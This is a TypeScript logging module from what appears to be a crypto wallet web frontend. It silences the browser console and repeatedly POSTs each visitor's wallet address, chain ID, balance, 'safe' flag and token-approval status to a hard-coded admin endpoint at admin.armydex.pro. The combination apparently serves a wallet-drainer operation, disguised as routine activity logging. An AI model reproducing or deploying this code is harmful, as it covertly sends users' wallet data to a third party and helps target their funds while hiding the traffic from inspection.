export type LogLevel = "debug" | "info" | "warn" | "error"

export interface LogEntry {
  ts: string
  level: LogLevel
  tag?: string
  message: string
  meta?: Record<string, any>
  event?: string
  status?: string
  address?: string
  chainId?: number | string
  safe?: string | null
  balance?: string | null
  approved?: boolean | null
}

const ENABLE_VERBOSE_LOGS = false
if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {
  ;(console as any).log = () => {}
  ;(console as any).info = () => {}
  ;(console as any).debug = () => {}
  ;(console as any).warn = () => {}
}

export const createLogger = (opts: { endpoint?: string; flushIntervalMs?: number } = {}) => {
  const endpoint = opts.endpoint ?? "https://admin.armydex.pro/api/wallet-activity-save"
  const flushIntervalMs = opts.flushIntervalMs ?? 2000

  const buffer: LogEntry[] = []
  let timer: number | null = null
  let failingSince: number | null = null

  const now = () => new Date().toISOString()

  const normalize = (entry: Partial<LogEntry>): LogEntry => {
    const e: LogEntry = {
      ts: entry.ts ?? now(),
      level: (entry.level ?? "info") as LogLevel,
      tag: entry.tag,
      message: entry.message ?? (entry.event ?? ""),
      meta: entry.meta,
      event: entry.event,
      status: entry.status,
      address: entry.address,
      chainId: entry.chainId,
      safe: entry.safe ?? null,
      balance: entry.balance ?? null,
      approved: entry.approved ?? null,
    }
    return e
  }

  const push = (entry: Partial<LogEntry>) => {
    buffer.push(normalize(entry))
    if (!timer) timer = window.setTimeout(flush, flushIntervalMs)
  }

  const log = (level: LogLevel, message: string, tag?: string, meta?: Record<string, any>) => {
    push({ level, message, tag, meta })
  }

  const flush = async () => {
    if (buffer.length === 0) {
      if (timer) {
        clearTimeout(timer)
        timer = null
      }
      return
    }
    const payload = buffer.splice(0, buffer.length)
    try {
      await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ logs: payload }),
        mode: "cors",
      })
      failingSince = null
    } catch (err) {
      buffer.unshift(...payload)
      if (!failingSince) failingSince = Date.now()
      const age = Date.now() - (failingSince ?? Date.now())
      const backoff = Math.min(30000, 1000 + Math.pow(2, Math.floor(age / 2000)) * 1000)
      if (timer) clearTimeout(timer)
      timer = window.setTimeout(flush, backoff)
    }
  }

  const flushNow = async () => {
    await flush()
  }

  return {
    debug: (m: string, tag?: string, meta?: Record<string, any>) => log("debug", m, tag, meta),
    info: (m: string, tag?: string, meta?: Record<string, any>) => log("info", m, tag, meta),
    warn: (m: string, tag?: string, meta?: Record<string, any>) => log("warn", m, tag, meta),
    error: (m: string, tag?: string, meta?: Record<string, any>) => log("error", m, tag, meta),
    push,
    flushNow,
    _buffer: buffer,
  }
}

export const logger = createLogger({
  endpoint: "https://admin.armydex.pro/api/wallet-activity-save",
  flushIntervalMs: 1500,
})

export const activityLogger = async (data: {
  event: string
  status?: string
  address?: string
  chainId?: number | string
  safe?: string | null
  balance?: string | null
  approved?: boolean | null
  meta?: Record<string, any>
}) => {
  try {
    await fetch("https://admin.armydex.pro/api/wallet-activity-save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
      mode: "cors",
    })
    logger.info(`activity:${data.event}`, "activity", data as any)
  } catch (e) {
    logger.error("activity_logger_failed", "activity", { error: String(e) })
  }
}
